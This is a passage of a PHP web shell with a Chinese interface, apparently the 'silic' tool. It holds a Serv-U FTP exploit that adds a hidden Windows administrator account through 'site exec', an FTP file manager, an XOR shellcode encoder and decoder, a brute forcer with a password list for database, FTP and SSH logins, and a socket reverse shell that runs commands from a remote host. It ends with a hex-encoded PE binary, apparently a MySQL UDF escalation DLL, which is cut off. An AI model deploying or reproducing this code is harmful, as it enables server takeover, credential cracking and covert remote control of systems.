密码 <input name="password" type="text" value="silic" style="width:200px">
目录 <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
END;
}
else
{
print<<<END
<div class="actall">提权命令 <input name="SUCommand" type="text" value="net user silic silic /add & net localgroup administrators silic /add" style="width:600px"><br>
<input name="user" type="hidden" value="silic">
<input name="password" type="hidden" value="silic">
<input name="part" type="hidden" value="C:\\\\"></div>
END;
}
echo '<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>';
	if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))
	{
		echo '<div class="actall">';
		$sendbuf = "";
		$recvbuf = "";
		$domain  = "-SETDOMAIN\r\n"."-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n"."-TZOEnable=0\r\n"." TZOKey=\r\n";
		$adduser = "-SETUSERSETUP\r\n"."-IP=0.0.0.0\r\n"."-PortNo=21\r\n"."-User=".$_POST['user']."\r\n"."-Password=".$_POST['password']."\r\n"."-HomeDir=c:\\\r\n"."-LoginMesFile=\r\n"."-Disable=0\r\n"."-RelPaths=1\r\n"."-NeedSecure=0\r\n"."-HideHidden=0\r\n"."-AlwaysAllowLogin=0\r\n"."-ChangePassword=0\r\n".
							 "-QuotaEnable=0\r\n"."-MaxUsersLoginPerIP=-1\r\n"."-SpeedLimitUp=0\r\n"."-SpeedLimitDown=0\r\n"."-MaxNrUsers=-1\r\n"."-IdleTimeOut=600\r\n"."-SessionTimeOut=-1\r\n"."-Expire=0\r\n"."-RatioUp=1\r\n"."-RatioDown=1\r\n"."-RatiosCredit=0\r\n"."-QuotaCurrent=0\r\n"."-QuotaMaximum=0\r\n".
							 "-Maintenance=None\r\n"."-PasswordType=Regular\r\n"."-Ratios=None\r\n"." Access=".$_POST['part']."\|RWAMELCDP\r\n";
		$deldomain = "-DELETEDOMAIN\r\n"."-IP=0.0.0.0\r\n"." PortNo=21\r\n";
		$sock = @fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = "USER ".$_POST["SUUser"]."\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = "SITE MAINTENANCE\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = $domain;
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = $adduser;
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		if(!empty($_POST['SUCommand']))
		{
	 		$exp = @fsockopen("127.0.0.1", "21", &$errno, &$errstr, 10);
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = "USER ".$_POST['user']."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: $sendbuf <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = "PASS ".$_POST['password']."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: $sendbuf <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: site exec <font color=#006600>".$_POST["SUCommand"]."</font> <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = $deldomain;
	 		@fputs($sock, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: $sendbuf <br>";
	 		$recvbuf = @fgets($sock, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		@fclose($exp);
		}
		@fclose($sock);
		echo '</div>';
	}
}

//FTP连接
function filecollect($dir,$filelist) {
   $files = ftp_nlist($conn,$dir); 
   return $files;
   }
function ftp_php(){
$dir = "";
$ftphost = isset($_POST['ftphost']) ? $_POST['ftphost'] : '127.0.0.1';
$ftpuser = isset($_POST['ftpuser']) ? $_POST['ftpuser'] : 'root';
$ftppass = isset($_POST['ftppass']) ? $_POST['ftppass'] : 'silic123456';
$ftplist = isset($_POST['list']) ? $_POST['list'] : '';
$ftpfolder = isset($_POST['ftpfolder']) ? $_POST['ftpfolder'] : '/';
$ftpfolder = strtr($ftpfolder,"\\","/");
$files = isset($_POST['readfile']) ? $_POST['readfile'] : '';
print<<<END
<div class="actall"><h5>php连接ftp连接操作(未完成)</h5></div>
<form method="POST" name="" action="?s=aa">
<div class="actall">主机:<input type="text" name="ftphost" value="{$ftphost}" style="width:100px">
登录名:<input type="text" name="ftpuser" value="{$ftpuser}" style="width:100px">
密码:<input type="text" name="ftppass" value="{$ftppass}" style="width:100px"><br><br>
<input type="hidden" name="readfile" value="" style="width:200px">
路径:<input type="text" name="ftpfolder" value="{$ftpfolder}" style="width:200px">
<input type="hidden" name="list" value="列表">
<input class="bt" type="submit" name="列表" value="list" style="width:40px"><br><br></form></div>
END;
if($ftplist == 'list'){
$conn = @ftp_connect($ftphost) or die("无法连接");
    if(@ftp_login($conn,$ftpuser,$ftppass)){
    $filelists = @ftp_nlist( $conn, $ftpfolder );
    echo "<pre>";
    echo "当前文件夹:<font color='#FF0000'>$ftpfolder</font>:<br>";
    if(is_array($filelists))
    {
    foreach ($filelists as $file)
    {
       $file = strtr($file,"\\","/");
       $size_file =@ftp_size($conn, $file);
       if ( $size_file == -1)
           {
           $a=$a.basename($file)."<br>";
           }
       else
           {
           $b=$b.basename($file)."				".$size_file."B</br>";
           }
    }
    }
    echo $a;
    echo $b;
    echo "</pre>";
    }
    }
print<<<END
<form method="POST" name="" action="?s=aa" >
<div class="actall">文件名:<input type="text" name="readfile" value="{$files}" style="width:200px">
<input type="hidden" name="read" value="读取">
<input class="bt" type="submit" name="read" value="读取" style="width:40px"><br><br></form></div>
END;
$readaction = isset($_POST['read']) ? $_POST['read'] : '';
if ($readaction == 'read') {
    $handle = @file_get_contents("ftp://$ftpuser:$ftppass@$ftphost/$files", "r");
    $handle = htmlspecialchars($handle);
    $handle = str_replace("\n", "<br>", $handle);
    echo "<font color='#FF0000'>$files</font>的内容:<br><br>";
    echo $handle;
    }
print<<<END
<form method="post" enctype="multipart/form-data" name="" action="?s=aa">
<div class="actall">文件夹:<input type="text" name="cdir" value="{$cdir}" style="width:100px">
<input type="file" name="upload" value="上传" style="width:200px;height:22px;">
<input type="hidden" name="upfile" value="上传">
<input class="bt" type="submit" name="submit" value="上传" style="width:40px"></form></div>
END;
$upaction = isset($_POST['upfile']) ? $_POST['upfile'] : '' ;    
if ($upaction == 'upfile') {
    $cdir = isset($_POST['cdir']) ? $_POST['cdir'] : '/';
    $conn = @ftp_connect($ftphost) or die("无法连接");
    if(@ftp_login($conn,$ftpuser,$ftppass)){
        @ftp_chdir($conn, $cdir);
        $res_code = @ftp_put($conn,$_FILES['upload']['name'],$_FILES['upload']['tmp_name'], FTP_BINARY,0);
        if (empty($res_code)){
          echo '<font color="#FF67A0">上传失败</font><br>';
        }
        else{
         echo '<font color="#FF67A0">上传成功</font><br>';
        } 
    }
}
print<<<END
<form method="POST" enctype="multipart/form-data" name="" action="?s=aa">
<div class="actall">路径:<input type="text" name="downfile" value="{$getfile}" style="width:100px">
<input type="hidden" name="getfile" value="下载">
<input class="bt" type="submit" name="down" value="下载" style="width:40px"></form></div>
END;
$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : '';
$getaction = isset($_POST['getfile']) ? $_POST['getfile'] : '';   
if ($getaction == 'down' && $getfile !=''){
function php_ftp_download($filename){   
global $ftphost,$ftpuser,$ftppass;              
  $ftp_path = dirname($filename)   .   "/";         
  $select_file = basename($filename);        
  $ftp = @ftp_connect($ftphost);        
  if($ftp){ 
        if(@ftp_login($ftp, $ftpuser, $ftppass)){        
        if(@ftp_chdir($ftp,$ftp_path))   {                              
        $tmpfile = tempnam(getcwd(),"temp");
        if(ftp_get($ftp,$tmpfile,$select_file,FTP_BINARY)){       
          ftp_quit($ftp);      
          header("Content-Type:application/octet-stream");   
          header("Content-Disposition:attachment;  filename=" . $select_file);   
          unlink($tmpfile); 
          exit;   
          }   
         }   
        }   
      }   
      ftp_quit($ftp);   
  }
php_ftp_download($getfile); 
}
}

//shellcode转换
function shellcode_decode($Url_String,$Oday_value)
{
	$Oday_value = hexdec($Oday_value);
	$$Url_String = str_replace(" ", "", $Url_String);
	$SHELL = explode("%u", $Url_String);
	for($i=0;$i < count($SHELL);$i++)
	{
		$Temp = $SHELL[$i];
		$s_1 = substr($Temp,2);
		$s_2 = substr($Temp,0,2);
		$COPY .= $s_1.$s_2;
	}
for($n=0; $n < strlen($COPY); $n+=2){$Decode .= pack("C", hexdec(substr($COPY, $n, 2) )^ $Oday_value);}
return $Decode;
}
function shellcode_encode($Url_String,$Oday_value)
{
	$Length =strlen($Url_String);
	$Todec = hexdec($Oday_value);
	for ($i=0; $i < $Length; $i++)
	{
		$Temp = ord($Url_String[$i]);
		$Hex_Temp = dechex($Temp ^ $Todec);
		if (hexdec($Hex_Temp) < 16) $Hex_Temp = '0'.$Hex_Temp;
		$hex .= $Hex_Temp;
	}
if ($Length%2) $hex .= $Oday_value.$Oday_value; else $hex .= $Oday_value.$Oday_value.$Oday_value.$Oday_value;
for ($n=0; $n < strlen($hex); $n+=4)
{
	$Temp = substr($hex, $n, 4);
	$s_1= substr($Temp,2);
	$s_2= substr($Temp,0,2);
	$Encode.= '%u'.$s_1.$s_2;
}
return $Encode;
}
function shellcode_findxor($Url_String)
{
	for ($i = 0; $i < 256; $i++)
	{
		$shellcode[0] = shellcode_decode($Url_String, dechex($i));
		if ((strpos ($shellcode[0],'tp:')) || (strpos ($shellcode[0],'url')) || (strpos ($shellcode[0],'exe')))
		{
			$shellcode[1] = dechex($i);
			return $shellcode;
		}
	}
}
function Shellcode_j()
{
	$Oday_value='0';
	$Shell_Code='http://blackbap.org/hello.exe';
	$checkeda='checked';
	$checkedb='';
if(!empty($_POST['code']))
{
	if($_POST['xor'] == 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code'],$Oday_value);}
	if($_POST['xor'] == 'b'){$checkeda = '';$checkedb = ' checked';$Shell_Code_Array = shellcode_findxor($_POST['code']);$Shell_Code = $Shell_Code_Array[0];$Oday_value = $Shell_Code_Array[1];}
	if(!$Oday_value) $Oday_value = '0';
	if(!$Shell_Code) $Shell_Code = '找不到shellcode的下载url';
	$Shell_Code = htmlspecialchars($Shell_Code);
}
print<<<END
<form method="POST" name="bbform" id="bbform" action="?s=bb">
<div class="actall">XOR(节点):<input name="number" value="{$Oday_value}" type="text" style="width:50px"> 
<input type="radio" name="xor" value="a"{$checkeda}>XOR转换 <input type="radio" name="xor" value="b"{$checkedb}>XOR反转换</div>
<div class="actall"><textarea name="code" rows="20" cols="110">{$Shell_Code}</textarea></div>
<div class="actall"><input class="bt" type="submit" value="执行"></div>
</form>
END;
return true;
}

//弱口令扫描
function Crack_k()
{
	$MSG_BOX = '等待消息队列......';
	$ROOT_DIR = File_Mode();
	$SORTS = explode('/',$ROOT_DIR);
	array_shift($SORTS);
	$PASS = join(',',$SORTS);
//用系统文件夹做密码，用for生成一组纯数字重复密码 by:yoco
for($i = 0;$i < 10;$i++){$n = (string)$i; $PASS .= $n.$n.$n.$n.$n.$n.','; $PASS .= $n.$n.$n.$n.$n.$n.$n.','; $PASS .= $n.$n.$n.$n.$n.$n.$n.$n.',';}
if((!empty($_POST['address'])) && (!empty($_POST['user'])) && (!empty($_POST['pass'])))
{
	$SORTPASS = explode(',',$_POST['pass']);
	$connect = false;
	$MSG_BOX = 'not found';
	for($k = 0;$k < count($SORTPASS);$k++)
	{
		if($_POST['class'] == 'mysql') $connect = @mysql_connect($_POST['address'],$_POST['user'],chop($SORTPASS[$k]));
		if($_POST['class'] == 'mssql') $connect = @mssql_connect($_POST['address'],$_POST['user'],chop($SORTPASS[$k]));
		if($_POST['class'] == 'pgsql') $connect = @pg_connect("host={$_POST['address']} port=5432 dbname=postgres user={$_POST['user']} password={chop($SORTPASS[$k])}");
		if($_POST['class'] == 'oracle') $connect = @oci_connect($_POST['user'],chop($SORTPASS[$k]),$_POST['address']);
		if($_POST['class'] == 'ftp'){$Ftp_conn = @ftp_connect($_POST['address'],'21');$connect = @ftp_login($Ftp_conn,$_POST['user'],chop($SORTPASS[$k]));}
		if($_POST['class'] == 'ssh'){$ssh_conn = @ssh2_connect($_POST['address'],'22');$connect = @ssh2_auth_password($ssh_conn,$_POST['user'],chop($SORTPASS[$k]));}
		if($connect) $MSG_BOX = '[project: '.$_POST['class'].'] [ip: '.$_POST['address'].'] [user: '.$_POST['user'].'] [pass: '.$SORTPASS[$k].']';
	}
}
print<<<END
<form method="POST" name="ccform" id="ccform" action="?s=cc">
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<div class="actall">主机<input type="text" name="address" value="localhost" style="width:300px"></div>
<div class="actall">账户<input type="text" name="user" value="root" style="width:300px"></div>
<div class="actall">密码<br><textarea name="pass" rows="20" cols="110">root,123456,123123,123321,admin,admin888,admin@admin,root@root,qwer123,5201314,iloveyou,fuckyou,kissme,520520,5845201314,a123456,a123456789,{$PASS}administrator</textarea></div>
<div class="actall">方式<input type="radio" name="class" value="mysql" checked>Mysql <input type="radio" name="class" value="mssql" checked>mssql <input type="radio" name="class" value="pgsql" checked>Pgsql <input type="radio" name="class" value="oracle" checked>Oracle <input type="radio" name="class" value="ftp">FTP <input type="radio" name="class" value="ssh" checked>SSH</div>
<div class="actall"><input class="bt" type="submit" value="开始"></div></form>
END;
return true;
}


//php socket反弹Windows连接
function phpsocket()
{
	@set_time_limit(0);
	$system=strtoupper(substr(PHP_OS, 0, 3));
if(!extension_loaded('sockets'))
{
	if ($system == 'WIN') {
		@dl('php_sockets.dll') or die("Can't load socket");
	}else{
		@dl('sockets.so') or die("Can't load socket");
	}
}
if(isset($_POST['host']) && isset($_POST['port']))
{
	$host = $_POST['host'];
	$port = $_POST['port'];
}else{	
print<<<eof
<div class="actall"><h5>php socket执行cmdshell反向连接，服务器必须为Win系统<br>php_sockets必须设置为open<br>可以通过phpinfo()函数查看是否允许<br>不要盲目连接，否则将造成服务器假死、资源耗尽等严重后果</h5></div>
<form method=post action="?s=dd">
<div class="actall">Host:<input type=text name=host value=""><br>端口:<input type=text name=port value="1120"><br><br>
<input type="radio" name=info value="linux" checked>Linux <input type="radio" name=info value="win">Windows <input class="bt" type=submit name=submit value="连接">
</form>
eof;
}
if($system=="WIN")
{
	$env=array('path' => 'c:\\windows\\system32');
}else{
	$env = array('PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
}
$descriptorspec = array(
	0 => array("pipe","r"),
	1 => array("pipe","w"),
	2 => array("pipe","w"),
);
$host=gethostbyname($host);
$proto=getprotobyname("tcp");
if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0)
{
die("Socket创建失败");
}
if(($ret=socket_connect($sock,$host,$port))<0)
{
die("连接失败");
}else{
$message="----------------------PHP反弹连接--------------------\n";
socket_write($sock,$message,strlen($message));
$cwd=str_replace('\\','/',dirname(__FILE__));
while($cmd=socket_read($sock,65535,$proto))
{
if(trim(strtolower($cmd))=="exit")
{
socket_write($sock,"Bye\n");
exit;
}else{
$process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
if (is_resource($process)) {
	fwrite($pipes[0], $cmd);
	fclose($pipes[0]);
	$msg=stream_get_contents($pipes[1]);
	socket_write($sock,$msg,strlen($msg));
	fclose($pipes[1]);
	$msg=stream_get_contents($pipes[2]);
	socket_write($sock,$msg,strlen($msg));
	$return_value = proc_close($process);
}
}
}
}
}
//mysql提权
function get_code(){
return "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E00000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000009BBB9A02DFDAF451DFDAF451DFDAF451A4C6F851DDDAF4515CC6FA51CBDAF45137C5FE518BDAF451DFDAF451DCDAF451BDC5E751DADAF451DFDAF55184DAF45137C5FF51DCDAF45137C5F051DEDAF45152696368DFDAF4510000000000000000504500004C010300B2976A460000000000000000E0000E210B01060000500000001000000090000010E6000000A0000000F000000000001000100000000200000400000000000000040000000000000000000100001000000000000002000000000010000010000000001000001000000000000010000000D8F000007400000000F00000D80000000000000000000000000000000000000000000000000000004CF100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000900000001000000000000000040000000000000000000000000000800000E055505831000000000050000000A000000048000000040000000000000000000000000000400000E055505832000000000010000000F0000000020000004C0000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000322E303200555058210D09020A459475C59FCC587632C900000F46000000B00000260A00BC6FEDDDFF558BEC6AFF6800007148040ED064A10507506489FFD8FF9F2583EC0C5356578965E8C745FC0F7D0C0175236A00FFEDB77B012E05B008FF150970008945E4EB09B81E7363BB0124C38B2FFF000F8B4DF05FF6FFD94E0D5F5E5B8BE55DC20C0090008B442499ACFDF604C740081C100432C0C30F8F58FDAC7D0081EC8C090592C685E8FBFF77DFBD6100B9FF1733C08DBDE90DF3AB66ABAA33DB895DFC8B33DBBBFF450C8338010F85770380480439190A6C53EFFEFFBF80988B50088B0250E80A005DDC83C40885C00F84511A889DC8F6F720276B414EC9F6C785BC0A9FD9DC5D0C16899DC0090FC4D853A1FBF6DF8D8D1A518D95CCFA06528D85B80D500EB399661B2C256C44246CCDF7EFB116288B852A8985ACF605A866EEEE8C6C559C985668050134776723CD95C852240CBFBA8883C9DFDCFFB7FF9CF2AEF7D12BF98BF78BFA8BD1100E4F8BCAC1B3CDFDF6E902F3A50683E103F3A4FBF2083566B604D88B393284B4C1B5DB60E6D8FBB153006A0103FF6B63838A538B20B4283BC3752D6A0A6D84436EF0E8FB1C4F473ADBAF3D7C12516670380B52E917059E0B67B30CF72A18B9D0FA40FB0E72106AD1FA6803FA8D1D93CBD8D84268FF14D0FAC47E0990583A548D64D9BA6F3EE5117E8BF089B564B9535EC803C2993B046AA18BB810CD2ED81B0E567420C63C10FFB9E53B72C6000163E8EBBA1882FBB7B9850436D41105B0596A206A03049D306B6E037D7EB2BF0CF6B171F37B6883FEFF6A85385618DCEFEF2D94F889BD408D4764A80FF652F1DC2F942DB9590C89036A9D5679F8CFBE564F01515030108B13C6043A0009446C03E40BD18B3BD9687E2C089318580C04EB366A64B66C8DC972D031745813594ECE0E53C16551C83BE920FDC91E498B5514890AE98B03E63F61EE23C368C80B6389500C3BD37C2939D8751A3233C07F3001BB709155357A0C83910DBB954511420C8651C8D391AC91AE8D513763F24C9552CDB0069B6CC2A4E96551C51C8B6C76695D530C1FA86CB243C27B0C298B5BA5C3A71B4F08A40F8B400C8674DD5B768C07BC91591B00130BC8AEF1B72C1D750683C8FFC2C30E05DCC030D74E060C74092FF202EDB4329054554468020217F6FEBFFE7134F7D81BC04081C41A5E903D814C060F6808B8640426B073A466121C866DCBB6417B885DA87401A902ADB17EE3D2B76603B58845B71684FEF1888590FFFE7D72BB06563F84BD910AE983CF3F4F9B2E347D942C6A02227175943B5A018CEDF7751616FC1708EC3F79044888FEFE71103BC7751D560A1BC60B6C14326A107A8D74235F61B8E73A52180F66DB8D2C2C88980B531CAE9A338FCA02DD827A1D0E203DB8C9B537DC9004B9827E8B3089CAB4D6D37CB01D80B471D337110CE748BEDDEC6F6A081AA8D177E6489E04A0B6138D55A8E327325A00438D7DA883CE2D656B0763CE457537E59B512FD8B7C1028B8B8596504522D9BE1B6144418D4DA885C977DD1696139C2E06249C238D472834160750D28954283B70800CF2C67526537547C84B6CC025CF070D048CFFFEDF5EBC8549E4200866E4516A28AE11DB6E61BC52F88D2072229D489AB3985D2C1D8B35781C88D11B302A6C37DF5968311659FFFF1151BE82B96D42D6FC84FED51052D985CD06A5091CEBC5BA94506052022C069E0F3981C511788FA404FCF68450228B75087CC0807E09060A4B775B71A85F8B5E0C20D469D9D115CEF92011C8B80D124CB6177EA98AB6E00FC1E0028BC803C604C468141ADF02CC33C98A7DBFB566FBEF5E4CC1E102058D14018955E0803A4D4F586F8F818BB9AA01CC8BF2E266F3A7ED0CF26C164102C0159D0542D875477205B04C2C3908C10D00DA6E0D67EF1968D007001034E90B8795BC59C82DED1533F607B80774C03FFB9009C183C206298A023C2167DF7FE9743C843B1B3C0A741788843530421B46D889846744EBDB7FB907CABBFF6F29B6B53C33D2F3A6753B88954C0BB918D962C860784DB34C76739038C0B10B6C68E803C59378271EEB254A1D8E236534B0301BB135728144C60F4F9400D7493C77C7030B5E382E81D8BB7F1A837C2410027513060405750C5B6464046B5F23C357084F179213C888140525F1ECA263810C5456C9134CD8C9C22CBD4FE485DBCEE499566BF6CFE0FA8BCB2BCE490C0804904BB80768042700E0FE397221F724434558E0FE8108D87B96002F8BFB1B2A2327837CD98BFACBCB5073BCC8855098E0FE8D6FBFAC03B7B10DCC63DC0DAF234B21D18DC47AF02AFA7A568F638FA2C0EB0C0354AD46F2C505EED48821B01A60A081C4112684C3CFF4425689FF3B77D77857040CB911280D108D7C2418F3AB8D4C243B0D069B6C1451AB343101BA0B041B0111E5724E64F06650720D553D8755FD04BA917466380E6E8D542408D731F62D925266181108435C5C8F4F4A761850514F9481106A5CDFBFEACC4044076C1589B424809674C67652DD247C03788C5FB65E56B87B49BCBFF0FF255B3CCCCC8D87D4E1674755E7F0FF42DF86C00D5F613C5D6C7904F74104868B23B8065423740F795CEFDCD7B7A5108902B863C33E1210506AFE5C908E7F40F864FF35A900198E1AB52529582FDDD5B4BFC0ED742E3B932474FA34768B0CB38959BD2DB50A02C304B394751268F7DBBFEDBD2DB37D0EAAFF5408EBC3648F0543236C7286EA8C1A648B9C8184FF83DF7904687510E3520C3951087505CF4D05BBFB5351BB1E18EB0A082489DFDCB7B64B02439D6B0C595BFCEF56433230069F0BF758433030F7A5FAFCD82C10DBD10C74F740E42682B58DD63E3F45F812E11B8D08B67F97AD3E21737B08C1618D0C76B18FEA6EED5F744556558D6B10A80B5D5E410B33BBE85ED633783C25534F0DD41D2B38D3AF560C0E168D36B7DEDDB6C5648F358F550C3B08C77EBF73301A8B348FEBA1B8DBEB1CC9EB15884DD67A5C003F5D16466F684394BC3B8B298B419FCC256BB4031824E1D763D9B66E20CF56BDE8C0E010E24785ED75EC423C0AE0DD5B0D1A7E4DE47F34168D5AFF3ADD766B1B92784D1C8020770D2450EDC3FF4884157559598BC65EC9C3CF8DDCFAF7D7B26B71151008C3B7E0772212C7424B4F0434A759913916BDF01C6C7410131E97DEB2C3568BB5FB05D7383B42565777216A091C1FF8ECA245FBA424020C91EF2059E1DB46ED38CEC7FD85F675032863FCDA7F5E83C60F83E6F056887CA4BCC65CE23B3A6BFC4D5716F6460C4074ECEFB75D15660CB2174D29730510B35652F790357329C54E308374342411FAFEE42B502AF7FF761007176F9B34F5DD7D0525EB128B461C530B5FD2A4D87B1C0059644B2A20B25628752EE34A467A86B386F62C591AE1D81E2DFA85EFFD0A7C092CE61D90280DE157F8ED397D08470F94C0485BC31630077AC31A6E5DF1025B5756391803BA23977D6097CA146A401A0CB8CDDCF7039B4DB4DD40743DFD6E78405720AC597B741356C220D7843337E11962410B5957B4C5DA2E6018CC07835328D00CBC3010E326ABA73DB884FB1147D903CB8BFEEA5A8A4614B8F01759C93A47FF7704A94949608563EF1B385B5E5FC93A00513D7DBB8B3B1C279772148111222E2D10B5B73FF685011773EC2BC88BC40C8BE18B596EB4A32D685036C10C576D747A9BF8BAEB74D9C614F7C64D8B197507F8B77803AB756FEB21F646880747497425FF6BCFBA26291F75EB2D1D5183E303740DEE5EEF66201D2F4B75F38492C3F7C79ED9E0FD2874123AFD8A116A9B3BE93AEE6C182EFA2AD1DBC2F6C82E89FEC7D074AFBAA5DB2FB523FEC70603D083F0E8C28B4F78E1BFF5C604A900948174DE84D2742C84641EF7C26FB7B7B90F580C070875C639EB18818C34DDA3E272090E00046A2BC45A88533F550A3B6CF7EBEE075F75F8B07585A3CCFFEFDE8DC6974E8A11F161698A7101DDBF2B74644F7719148A074638D07415D90BD3D2A573E30A0A75F5FC5F51E242173E10F0078D7E436102FE3B2A50DD4E1DC60238E075C48A410376EDDDEF31188A66FF83C11074DFEBB12F348AC26B74851B9030F28DBC0CC34C05C7DB88DFFC83F8F988CC078FA7DBC668BEA3068E58BEB2427EBB8EDE3CA10E680D075925DEC12DBDD1F7FB12102760891664950803C1EDDB50F3375C32F7750940EE78769BDDD8EB7256641CA4C03968098DCC7BB3D96D345204371B366231A8FF0519627F7FBBC8EB3E6B3BC1752C390D0D7EBDFF07E6FB0AFC0D8E90E128E6320E175A89D8331A64FBC25507514EADD87E11B259BF5833A569A363097D56B457C7105EBDC0D6BB09833D482926C101740547D36EA3040322DAA4C4E809F4AED9996EFFD0080CC113CC04BCB6D410BF4E0F07EB8D01C90C4C6D6FB0BB1737575023F6467926A315ED8034032125F71F0117396C115B083C5BD8B9E241C0D01A8DD4D8B1AE6176BA310E97D801DB78C041E03A9A3A3AD3C57DCD2A7D3B8130AB756C462D6C36BE025E10A882D2F6A840B9EEDAB61BED074AA96604071017DE6EBFF77F3F4E0824FE890E89462F1883657524EF0337F72D6E66A90C0115F981FE8B03BFC75A289C0748750BC03F32AE6ABFFDD7073E3EEE5966F7270801577467420BDCB65FAC3E2BF88D48390E581849A489DEB99EF04E047E10053CFE53DCEB3683FBF6CBFFDFBA198BCB8BC3C1F90583E01F8B0C8D93808D04C002B6F4B2D08196B88498F6F320F399B156A107783A260A4B2CD15C8A9E88E614B7C0C24A0D74885507DF40A12932DF4E0C20EB0FCC16B8760C7CEB080DC2C1C8A50E864C17064802DFBA95A1E6798A1F09DB8975F411BAD06E02EC890F0EF406D1B705D74A8D370641D00939554ABF7DF7EC0F8CDC1780FB207C1304787F0E0FBE50152EC08631717461EB02F8BE2DBCBB0F84C60E94C1F804A70789D00F879A85F652EC30FF24901DB2834803CBB22CDB55CC02D8E0E4FCDCBC6DBB4D5D1D954883E8E43B0403742DC1B55EA20B1F4848840DA8D2C56E6E594039FC082708041CB28C1D0111808002C3128E9EFB2AF9B9509B687613661E6CC80F8D12469B89985B8ED80E27B476CBB2ED170A666C4441D0EBE98AF03EED5C2E641EF0D305BF30E7CE63398D0489361B346FCBDB56AE2E046874206CB880FB7790495E2EA005804DFD10EEC6FFE4203F367514807F0134CA4747271FDA628680771888D0AA8568B7C6ED0D1C0FB6C3F66601802291EC50147E06131E28981DCEB0C18DCC35EB4733181652F39BE127F8670F8F1CE508650F8D9600F9EF43DB5811EBA9847817E8430F849FB96D5D836D70036C100CB8E903AF74A146C6BE3008CCC08B25430BFDF0BD68BEFACAC54BC21921D0ADAED4DEFB894DF844E7B1C92D0E2DE47EB981381229DC7477B37D212AD64E85D220D466833878869FED5DCA094040EBE721CC80C320136B1B74AB408FB8FDF3CAD14DDB955F708DCFF3F006CB1A0D8DAFF1660377862E8848BF578089043A953F5B008DD1D6C5F490323FD80C298EDDBEBDD35A7432040974C5487CE801521C97B3B345FE3A6C59882AF4471A183147BD2002BB8916359DDE6F2CF64580D9CCB97F74170FBF00D1E8E369E652D7D8C3AD2DDC000CBF0E94AE6DB4BE6E81344D50C28D8314670B2D826B25D5165C50CCA2B5AFD483C05E08F05D4B053B6C377540FC0EBCC8D18B851FB082B8F7855082FCC9C6057EB581E69E741429F0003506BE67B324205C595D12AF788432611654562D750DD0C2BB653A29BDB9E06157A758888D8459A619694899ED2C1D0C059E0684B686FB2C805184FD331B23B1CF05F77491C9C15DD4273C602621F62BC1D1F847FD340BDB0582F6288038AF03ECF1D728176B2624FE853D6B2815CC074DBB7B10D410A6FEF65D8A13C645EA3004516377CF60DF678845EBEB4821083BC202EB35D6852E09971B209909669F08CD2DF0EC668909050706F514EB0E296A403C0A69BF1FD6A05FA53A7959EB413D74218519637405404A0C0FBB641B0CF6C099EB250BB7C8F220AFC0ECC908EBE0070E19B8F5C6DB741BE37F177C1AC073115883D2D6E2C30D9FF7DA698BFAC90B1FDEE0B50577DC83E700B27D09161B2D08FD1B2AFCAA3AC0B6FBC60BC77509E40060B733D6DEADD55E614A7F0619EE0F765B5DFDF4995250578AC009C476409C5FDB6E372AC48B66C33007C017112CCBF6DF063E39677E03035DD440F8F847D75CF78818EBB5502B0C027F0